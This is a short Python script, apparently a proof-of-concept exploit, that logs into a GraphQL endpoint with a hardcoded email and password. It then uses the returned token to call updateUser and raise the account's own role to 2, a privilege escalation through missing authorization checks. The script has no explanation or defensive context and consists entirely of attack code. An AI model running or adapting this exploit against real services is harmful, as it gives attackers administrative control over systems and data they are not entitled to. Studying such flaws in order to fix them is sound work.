import requests
import json

url = 'https://mail.equestriasociety.com/graphql'
query = """
mutation {
  login(email: "luna.belle@equestriasociety.com", password: "CorrectHorseBatteryStaple?") {
    token
    user { id }
  }
}
"""

response = requests.post(url, json={'query': query})
data = response.json()
if 'data' in data and data['data']['login']:
    token = data['data']['login']['token']
    uid = data['data']['login']['user']['id']
    headers = {'Authorization': f'Bearer {token}'}

    query = f"""
    mutation {{
      updateUser(id: "{uid}", role: 2) {{
        id
        email
        name
        role
      }}
    }}
    """
    response = requests.post(url, json={'query': query}, headers=headers)
    print("updateUser:")
    print(json.dumps(response.json(), indent=2))
